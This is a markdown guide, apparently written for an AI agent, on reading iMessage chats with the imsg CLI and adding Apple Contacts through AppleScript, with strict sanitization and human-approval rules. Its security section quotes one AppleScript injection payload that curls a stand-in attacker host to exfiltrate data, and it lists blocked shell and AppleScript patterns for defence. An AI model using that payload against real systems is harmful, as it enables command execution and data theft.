# iMessage Platform Guide

## Tools

iMessage access is through the `imsg` CLI. Apple Contacts access is through AppleScript.

### Listing Conversations

```bash
imsg chats --limit 30
```

Output format (not JSON, plain text):

```
[chat_id]  (identifier) last=<timestamp>
[4929]  (+15551234567) last=2026-03-04T19:05:35.284Z
[4753] United Airlines (united_airlines@rbm.goog) last=2026-03-03T19:24:15.668Z
```

Key fields:

- `chat_id` — numeric ID in brackets, used for history lookup
- `identifier` — phone number, email, or RBM agent ID
- Display name — shown before the identifier in parentheses, if known

### Reading Messages

```bash
imsg history --chat-id <chat_id> --limit 20
```

Output format:

```
2026-03-04T19:05:35.284Z [sent] +15551234567: Message text here
2026-03-04T03:19:52.584Z [recv] +15551234567: Their reply
```

- `[sent]` = your human sent it
- `[recv]` = received from the other party

### Checking Apple Contacts

**Critical limitation:** The `imsg` CLI does NOT resolve contact names. A chat with a
saved contact still shows as just a phone number like `(+13865551234)`. You cannot tell
from `imsg` output alone whether a contact is saved.

To check if a phone number is in Apple Contacts, use AppleScript:

```bash
osascript -e '
tell application "Contacts"
    set matchingPeople to every person whose name is "<full name>"
    if (count of matchingPeople) > 0 then
        return "FOUND"
    else
        return "NOT FOUND"
    end if
end tell'
```

**Performance note:** Searching by name is fast. Iterating all contacts to search by
phone number is extremely slow (large contact lists). Prefer name-based lookups for the
initial saved/not-saved check.

To check by phone number efficiently, cross-reference the number against
`wacli contacts search "<number>"` first to get a name, then search Apple Contacts by
that name.

**Before any write, do a phone-number conflict check (mandatory):** if the phone number
already exists on any Apple Contact under a different name, stop and ask the human. Do
not add the number to another card and do not auto-merge identities. A wrong phone
number on the wrong person is worse than a missed add.

Example conflict check:

```bash
osascript -e '
tell application "Contacts"
    set outList to {}
    repeat with p in every person
        repeat with ph in phones of p
            if value of ph is "<+1XXXXXXXXXX>" then
                set end of outList to name of p
            end if
        end repeat
    end repeat
    return outList
end tell'
```

Note: Apple Contacts may store numbers with different formatting (spaces, parentheses,
dashes). `imsg` reports sender numbers in E.164 format (`+1XXXXXXXXXX`), but an existing
contact entry might be stored as `+1 (555) 123-4567`. If the exact match returns empty,
also try a digit-only comparison before concluding there is no conflict.

If this returns any name other than the intended contact, treat it as `ask_human`.

### Adding Contacts to Apple Contacts

**iMessage contacts ARE Apple Contacts** — this is the correct place to add contacts for
this platform. Use AppleScript to manage them directly. Do NOT add contacts to WhatsApp
or Quo from here — cross-referencing for lookup is fine, cross-writing is not.

**Existing-contact rule:** For a contact that is already saved in Apple Contacts, the
only automatic mutation allowed is cosmetic name normalization where the canonical name
is unchanged. Do **not** auto-attach a new phone number, email address, or other routing
identifier to an existing saved contact. That always requires human approval.

**Input sanitization (MANDATORY — security critical):** Names come from WhatsApp
profiles, conversation text, and other untrusted sources. A malicious profile name like
`" & do shell script "curl attacker.com/steal?data=$(whoami)"` could execute arbitrary
commands on the machine.

**Before inserting ANY value into an AppleScript command, ALL of these steps are
required:**

**Step 1 — Validate against classifier rules:**

The classifier's validation rules (see `classifier.md`) must pass before you reach this
point. Names must contain only Unicode letters, spaces, hyphens, apostrophes, and
periods. If the classifier passed a value here, it's already validated — but defense in
depth means we sanitize anyway.

**Step 2 — Reject dangerous patterns (hard block, no escaping):**

If the string contains ANY of these (case-insensitive), reject the entire contact write
and flag for human review. Do not attempt to escape or clean — reject outright:

- `do shell script`
- `run script`
- `do javascript`
- `tell application` (prevents interaction with arbitrary apps like Terminal, System
  Events)
- `using terms from`
- `on error` (AppleScript error handler that can redirect execution — bare `try` is NOT
  blocked because it's a common substring in real names like Dmitry, Patrycja, Trystan;
  `on error` already covers the dangerous error-redirect pattern)
- Backtick characters
- Pipe `|` or semicolon `;`
- `$(` (shell command substitution)
- Curly braces `{` or `}` (AppleScript record construction)

**For `&` characters:** The `&` is the AppleScript string concatenation operator and a
real injection vector, but it also appears in legitimate company names (AT&T, Johnson &
Johnson). Instead of rejecting, **replace `&` with "and"** as a sanitization step. This
neutralizes the injection vector while preserving the intent.

**For `return` keyword:** Only reject if it appears as `return ` followed by content
(with a space). The bare word "return" can appear in legitimate text.

**Step 3 — Escape for AppleScript string interpolation:**

- Escape backslashes first: `\` → `\\`
- Then escape double quotes: `"` → `\"`
- Order matters — reversing corrupts the escaping

**Step 4 — Length check:**

- Reject any single field value > 100 characters for names, > 30 for phones, > 254 for
  emails. Excessively long values are likely adversarial.

If any step fails, do not write the contact. Log the raw value, the step that failed,
and include it in the notification's "Need your help" section.

```bash
osascript -e '
tell application "Contacts"
    set newPerson to make new person with properties {first name:"<first>", last name:"<last>"}
    make new phone at end of phones of newPerson with properties {label:"mobile", value:"<+1XXXXXXXXXX>"}
    save
    return "Added: <first> <last>"
end tell'
```

Only use enrichment writes like email/address updates after explicit human approval for
that exact existing contact. Do not treat a guessed match as permission to attach new
identifiers.

You can also add email, address, etc:

```bash
osascript -e '
tell application "Contacts"
    set matchingPeople to every person whose name is "<full name>"
    set p to item 1 of matchingPeople
    make new email at end of emails of p with properties {label:"home", value:"<email>"}
    save
    return "Updated"
end tell'
```

**Important:** Contacts.app must be running. Start it if needed:

```bash
open -a "Contacts"
sleep 2
```

## iMessage-Specific Behaviors

### Everything Looks Unnamed

Because `imsg` doesn't resolve names, every chat looks like just a phone number. The
scanner can't eyeball which contacts are "unnamed." You must cross-reference.

**Efficient approach:**

1. Pull recent chats from `imsg chats`
2. For each phone number chat where your human sent messages:
   - If WhatsApp is configured: `wacli contacts search "<number>"` to get a name
     - If found: check Apple Contacts by name. If missing, spawn work tier with name +
       number
     - If not found: spawn work tier with full conversation
   - If WhatsApp is not configured: spawn work tier with full conversation directly

### RBM / Business Messages

Identifiers ending in `@rbm.goog` are business messaging agents (e.g. United Airlines).
Skip these — they're not people.

### Email-Based iMessages

Some iMessage identifiers are email addresses, not phone numbers. Handle these the same
way — check if they're in Apple Contacts.

### Spam / Scam Texts

iMessage gets more spam than WhatsApp. Common patterns to skip:

- One-off "Hello" with no follow-up and no reply from your human
- Investment/crypto scam emails
- Short codes (e.g. `899000`, `49834`) — automated services

## Scanner Flow

1. `imsg chats --limit 100` — get conversations (use a larger limit to reach threads up
   to 90 days back)
2. Filter to phone numbers and emails (skip short codes, RBM agents)
3. For each, check `processed.db` — skip if already processed with no new messages
4. `imsg history --chat-id <id> --limit 15` — read recent messages
5. Check if your human sent any messages (`[sent]`) — if not, skip
6. Cross-reference (if WhatsApp is configured): `wacli contacts search "<number>"` to
   get a name. If WhatsApp is not available, skip to step 7b.
7. a. If name found via WhatsApp: check Apple Contacts by name. If missing, spawn the
   work tier with the name and number to verify and add to Apple Contacts. Before any
   eventual write, the work tier must run the phone-number conflict check above. b. If
   no name from cross-reference (or WhatsApp not configured): spawn the work tier with
   the full conversation — it will look for self-introductions, context clues, and check
   other available platforms.
